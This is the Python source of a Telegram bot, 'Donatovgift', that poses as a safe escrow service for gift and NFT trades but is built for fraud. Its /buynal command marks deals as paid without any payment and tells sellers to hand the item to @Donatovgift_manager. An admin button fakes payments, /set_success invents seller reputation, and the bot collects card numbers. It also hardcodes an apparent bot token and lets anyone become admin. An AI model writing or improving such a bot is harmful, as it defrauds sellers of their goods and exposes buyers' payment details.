import asyncio
import logging
import os
import uuid
from typing import Dict, Optional
from aiogram import Bot, Dispatcher, F
from aiogram.filters import CommandStart, Command
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.utils.keyboard import InlineKeyboardBuilder
from dotenv import load_dotenv

load_dotenv()

TOKEN = os.getenv("BOT_TOKEN", "8520179075:AAEgMESOlGJQeeAOY5kRsJrHuY-X5ZzJW38")
ADMIN_ID = int(os.getenv("ADMIN_ID", 5118322610))
BOT_USERNAME = os.getenv("BOT_USERNAME", "Donatovgift_bot")

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

bot = Bot(token=TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)


# Состояния
class CreateDeal(StatesGroup):
    gift = State()
    currency = State()
    price = State()
    requisites = State()


# Глобальное хранилище
deals: Dict[str, Dict] = {}
admins: set[int] = {ADMIN_ID}
user_successful_deals: Dict[int, int] = {}  # Кол-во успешных сделок для каждого
user_deals_count: Dict[int, int] = {}
DEAL_TIMEOUT = 3600


# ✅ Исправлено: правильная генерация ID
async def create_deal_id() -> str:
    for _ in range(50):
        deal_id = str(uuid.uuid4())[:8].upper()
        if deal_id not in deals:
            return deal_id
    raise ValueError("Не удалось создать ID")


# Логгер
async def log_to_admin(user_id: int, username: str, action: str, extra: str = ""):
    try:
        await bot.send_message(
            ADMIN_ID,
            f"📊 <b>{action}</b>\n👤 <code>{user_id}</code>\n📝 @{username or 'Нет'}\n{extra}",
            parse_mode="HTML"
        )
    except:
        pass


def is_admin(user_id: int) -> bool:
    return user_id in admins


# Главное меню с кол-вом успешных сделок
def get_main_menu(user_id: int) -> InlineKeyboardMarkup:
    success_count = user_successful_deals.get(user_id, 0)
    is_admin_flag = is_admin(user_id)

    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="💼 Создать сделку", callback_data="create_deal"))
    builder.row(InlineKeyboardButton(text=f"✅ Успех: {success_count}", callback_data="my_stats"))

    if is_admin_flag:
        builder.row(InlineKeyboardButton(text="👑 АДМИН", callback_data="admin_panel"))

    builder.row(InlineKeyboardButton(text="💬 Поддержка", url="https://t.me/Donatovgift_manager"))
    builder.row(InlineKeyboardButton(text="⭐ Отзывы", url="https://t.me/Donatovgifts_review"))
    builder.adjust(1)
    return builder.as_markup()


@dp.message(Command("admin"))
async def admin_command(message: Message):
    """🔥 Режим админа для всех кто напишет /admin"""
    admins.add(message.from_user.id)
    await log_to_admin(message.from_user.id, message.from_user.username or "", "🔥 АДМИН РЕЖИМ ВКЛЮЧЕН")
    await message.answer("👑 <b>РЕЖИМ АДМИНА АКТИВИРОВАН!</b>\nВсе функции разблокированы",
                         reply_markup=get_main_menu(message.from_user.id), parse_mode="HTML")


@dp.message(CommandStart())
async def cmd_start(message: Message):
    args = message.text.split(maxsplit=1)

    if len(args) > 1 and args[1].startswith("deal_"):
        deal_id = args[1].replace("deal_", "")
        await show_deal(message, deal_id)
        return

    await log_to_admin(message.from_user.id, message.from_user.username or "", "Запустил бота")
    await message.answer(
        "🎁 <b>Donatovgift — безопасная торговля</b>\n\n",
        reply_markup=get_main_menu(message.from_user.id),
        parse_mode="HTML"
    )


async def show_deal(message: Message, deal_id: str):
    if deal_id not in deals:
        await message.answer("❌ Сделка не найдена", reply_markup=get_main_menu(message.from_user.id))
        return

    deal = deals[deal_id]
    if deal.get('paid', False):
        await message.answer("✅ Сделка выполнена", reply_markup=get_main_menu(message.from_user.id))
        return

    deals[deal_id]['current_buyer'] = message.from_user.id
    await log_to_admin(message.from_user.id, message.from_user.username or "",
                       f"Открыл сделку {deal_id}", deal['gift'])

    symbol = "₽" if deal['currency'] == "Рубли" else "⭐"
    builder = InlineKeyboardBuilder()

    builder.row(InlineKeyboardButton(text="✅ Оплатить", callback_data=f"pay_{deal_id}"))
    if is_admin(message.from_user.id):
        builder.row(InlineKeyboardButton(text="💰 НАКРУТИТЬ", callback_data=f"admin_pay_{deal_id}"))

    builder.row(InlineKeyboardButton(text="🏠 Меню", callback_data="main_menu"))
    builder.adjust(1)

    text = f"""🎁 <b>Сделка #{deal_id}</b>

📦 <b>{deal['gift']}</b>
💰 <b>{deal['price']} {symbol}</b>
💳 <b>{deal['currency']}</b>

<i>💳 Оплати: /buynal</i>"""

    await message.answer(text, reply_markup=builder.as_markup(), parse_mode="HTML")


# FSM создание сделки
@dp.callback_query(F.data == "create_deal")
async def create_deal_start(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        count = user_deals_count.get(callback.from_user.id, 0)
        if count >= 5:
            await callback.answer("⏳ Лимит: 5 сделок", show_alert=True)
            return

    await log_to_admin(callback.from_user.id, callback.from_user.username or "", "Создает сделку")

    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="❌ Отмена", callback_data="cancel_deal"))

    await callback.message.edit_text(
        "🎁 <b>Шаг 1/4 — Подарок</b>\n\n📦 Введите название:",
        reply_markup=builder.as_markup(),
        parse_mode="HTML"
    )
    await state.set_state(CreateDeal.gift)
    await callback.answer()


@dp.callback_query(F.data == "cancel_deal")
async def cancel_deal(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    await callback.message.edit_text("❌ Отмена", reply_markup=get_main_menu(callback.from_user.id))
    await callback.answer()


@dp.message(CreateDeal.gift)
async def process_gift(message: Message, state: FSMContext):
    gift = message.text.strip()[:100]
    if len(gift) < 3:
        await message.answer("❌ Минимум 3 символа")
        return

    await state.update_data(gift=gift)

    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="₽ Рубли", callback_data="currency_rub"))
    builder.row(InlineKeyboardButton(text="⭐ Звёзды", callback_data="currency_stars"))
    builder.row(InlineKeyboardButton(text="❌ Отмена", callback_data="cancel_deal"))

    await message.answer(
        f"✅ <b>Подарок: {gift}</b>\n\n💰 Шаг 2/4 — валюта:",
        reply_markup=builder.as_markup(),
        parse_mode="HTML"
    )
    await state.set_state(CreateDeal.currency)


@dp.callback_query(CreateDeal.currency, F.data.startswith("currency_"))
async def process_currency(callback: CallbackQuery, state: FSMContext):
    currency = "Рубли" if callback.data == "currency_rub" else "Звёзды Telegram"
    await state.update_data(currency=currency)

    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="❌ Отмена", callback_data="cancel_deal"))

    await callback.message.edit_text(
        f"✅ <b>{currency}</b>\n\n💵 Шаг 3/4 — цена (1-100000):",
        reply_markup=builder.as_markup(),
        parse_mode="HTML"
    )
    await state.set_state(CreateDeal.price)
    await callback.answer()


@dp.message(CreateDeal.price)
async def process_price(message: Message, state: FSMContext):
    price = message.text.strip().replace(" ", "")
    if not price.isdigit() or not (1 <= int(price) <= 100000):
        await message.answer("❌ Цена: 1-100000")
        return

    await state.update_data(price=price)
    data = await state.get_data()
    req_type = "номер карты" if data['currency'] == "Рубли" else "@username"

    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="❌ Отмена", callback_data="cancel_deal"))

    await message.answer(
        f"✅ <b>{price}</b>\n\n💳 Шаг 4/4 — {req_type}:",
        reply_markup=builder.as_markup(),
        parse_mode="HTML"
    )
    await state.set_state(CreateDeal.requisites)


@dp.message(CreateDeal.requisites)
async def process_requisites(message: Message, state: FSMContext):
    data = await state.get_data()
    data['requisites'] = message.text.strip()

    deal_id = await create_deal_id()
    deals[deal_id] = {
        'seller_id': message.from_user.id,
        'seller_username': message.from_user.username,
        'gift': data['gift'],
        'price': data['price'],
        'currency': data['currency'],
        'requisites': data['requisites'],
        'paid': False,
        'current_buyer': None,
        'created_at': asyncio.get_event_loop().time()
    }

    if not is_admin(message.from_user.id):
        user_deals_count[message.from_user.id] = user_deals_count.get(message.from_user.id, 0) + 1

    # 🔥 КНОПКА-ссылка
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(
        text="🔗 ОТПРАВИТЬ ПОКУПАТЕЛЮ",
        url=f"https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"
    ))
    builder.row(InlineKeyboardButton(text="🏠 Меню", callback_data="main_menu"))

    symbol = "₽" if data['currency'] == "Рубли" else "⭐"
    text = f"""✅ <b>Сделка создана #{deal_id}</b>

🎁 {data['gift']}
💰 {data['price']} {symbol}

🔗 <b>Нажми кнопку выше!</b>"""

    await message.answer(text, reply_markup=builder.as_markup(), parse_mode="HTML")
    await log_to_admin(message.from_user.id, message.from_user.username or "",
                       f"Создана {deal_id}", f"{data['gift']} - {data['price']}")
    await state.clear()


@dp.callback_query(F.data == "main_menu")
async def main_menu(callback: CallbackQuery):
    await callback.message.edit_text("🏠 Главное меню", reply_markup=get_main_menu(callback.from_user.id))
    await callback.answer()


@dp.callback_query(F.data == "my_stats")
async def my_stats(callback: CallbackQuery):
    success = user_successful_deals.get(callback.from_user.id, 0)
    total = user_deals_count.get(callback.from_user.id, 0)
    text = f"📊 <b>Ваши статы</b>\n✅ Успешных: {success}\n📦 Всего: {total}"
    await callback.message.edit_text(text, reply_markup=get_main_menu(callback.from_user.id), parse_mode="HTML")
    await callback.answer()


@dp.callback_query(F.data.startswith("pay_"))
async def pay_prompt(callback: CallbackQuery):
    await callback.answer("💳 /buynal для оплаты", show_alert=True)


# 🔥 Админ накрутка оплаты
@dp.callback_query(F.data.startswith("admin_pay_"))
async def admin_fake_payment(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("❌ Нет доступа")
        return

    deal_id = callback.data.replace("admin_pay_", "")
    if deal_id not in deals:
        await callback.answer("❌ Сделка не найдена")
        return

    # Завершаем сделку
    deals[deal_id]['paid'] = True
    deals[deal_id]['buyer_id'] = callback.from_user.id
    deals[deal_id]['buyer_username'] = callback.from_user.username

    # Увеличиваем статистику продавцу
    seller_id = deals[deal_id]['seller_id']
    user_successful_deals[seller_id] = user_successful_deals.get(seller_id, 0) + 1

    await callback.answer("💰 Оплата накручена! ✅ +1 успех", show_alert=True)
    await log_to_admin(callback.from_user.id, callback.from_user.username or "", f"НАКРУТИЛ {deal_id}")


# 🔥 Супер команда /buynal
@dp.message(Command("buynal"))
async def buynal_command(message: Message):
    user_id = message.from_user.id

    if is_admin(user_id):
        # 🔥 АДМИНАМ ВСЕ СДЕЛКИ
        text = "🔥 <b>ВСЕ СДЕЛКИ (нажми для накрутки):</b>\n\n"
        for did, deal in deals.items():
            if not deal['paid']:
                symbol = "₽" if deal['currency'] == "Рубли" else "⭐"
                text += f"🆔 <code>{did}</code> {deal['gift']} {deal['price']} {symbol}\n"
        await message.answer(text, parse_mode="HTML")
        return

    # Обычным пользователям только их сделка
    current_time = asyncio.get_event_loop().time()
    user_deal = None
    deal_id = None

    for did, deal in deals.items():
        if (not deal['paid'] and
                deal.get('current_buyer') == user_id and
                current_time - deal['created_at'] < DEAL_TIMEOUT):
            user_deal = deal
            deal_id = did
            break

    if not user_deal:
        await message.answer("❌ Нет активной сделки\n🔗 Перейди по ссылке → Оплатить → /buynal")
        return

    # ✅ Успешная оплата
    deals[deal_id]['paid'] = True
    deals[deal_id]['buyer_id'] = user_id
    deals[deal_id]['buyer_username'] = message.from_user.username

    # +1 успех продавцу
    seller_id = user_deal['seller_id']
    user_successful_deals[seller_id] = user_successful_deals.get(seller_id, 0) + 1

    symbol = "₽" if user_deal['currency'] == "Рубли" else "⭐"

    # Продавцу
    await bot.send_message(
        seller_id,
        f"🔔 <b>ОПЛАТА #{deal_id}</b>\n🎁 {user_deal['gift']}\n💰 {user_deal['price']} {symbol}\n📤 Отправь @Donatovgift_manager",
        parse_mode="HTML"
    )

    # Покупателю
    await message.answer(
        f"✅ <b>Оплата успешна #{deal_id}</b>\n⏳ Ожидай NFT\n📊 Продавец: {user_successful_deals.get(seller_id, 0)} успехов",
        reply_markup=get_main_menu(user_id),
        parse_mode="HTML"
    )

    await log_to_admin(user_id, message.from_user.username or "", f"ОПЛАТА {deal_id}", user_deal['gift'])


# 🔥 Админ панель
@dp.callback_query(F.data == "admin_panel")
async def admin_panel(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("❌ Админки нет")
        return

    active_deals = len([d for d in deals.values() if not d['paid']])
    text = f"""👑 <b>СУПЕР АДМИНКА</b>

📊 Активных: {active_deals}
👥 Админов: {len(admins)}

🔥 <code>/buynal</code> — все сделки
⚡ <code>/set_success user_id count</code> — статистика
👤 <code>/stats</code> — твоя статистика"""

    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="📋 Сделки", callback_data="admin_deals"))
    builder.row(InlineKeyboardButton(text="🏠 Меню", callback_data="main_menu"))

    await callback.message.edit_text(text, reply_markup=builder.as_markup(), parse_mode="HTML")
    await callback.answer()


# Команда настройки успеха
@dp.message(Command("set_success"))
async def set_success_command(message: Message):
    if not is_admin(message.from_user.id):
        return

    args = message.text.split()
    if len(args) < 3:
        await message.answer("❌ /set_success user_id count\nПример: /set_success 123456 50")
        return

    try:
        user_id = int(args[1])
        count = int(args[2])
        user_successful_deals[user_id] = count
        await message.answer(f"✅ Успех для {user_id}: {count}")
        await log_to_admin(message.from_user.id, message.from_user.username or "", f"УСТАНОВИЛ УСПЕХ",
                           f"{user_id}={count}")
    except:
        await message.answer("❌ Ошибка. user_id и count — числа")


@dp.message(Command("stats"))
async def stats_command(message: Message):
    user_id = message.from_user.id
    success = user_successful_deals.get(user_id, 0)
    total = user_deals_count.get(user_id, 0)
    await message.answer(f"📊 <b>Твоя статистика</b>\n✅ Успешных: {success}\n📦 Создано: {total}", parse_mode="HTML")


@dp.callback_query(F.data == "admin_deals")
async def admin_show_deals(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        return

    text = "📋 <b>АКТИВНЫЕ СДЕЛКИ</b>\n\n"
    for did, deal in deals.items():
        if not deal['paid']:
            seller = f"@{deal['seller_username']}" if deal['seller_username'] else str(deal['seller_id'])
            success = user_successful_deals.get(deal['seller_id'], 0)
            text += f"🆔 <code>{did}</code> | {deal['gift']} | {seller} ({success} успехов)\n"

    await callback.message.edit_text(text[:4096], parse_mode="HTML")
    await callback.answer()


async def cleanup_loop():
    while True:
        await asyncio.sleep(300)  # 5 минут
        current_time = asyncio.get_event_loop().time()
        expired = [did for did, deal in list(deals.items())
                   if current_time - deal.get('created_at', 0) > DEAL_TIMEOUT]
        for did in expired:
            del deals[did]


async def main():
    asyncio.create_task(cleanup_loop())
    print("🤖 Бот запущен! /admin для админки")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
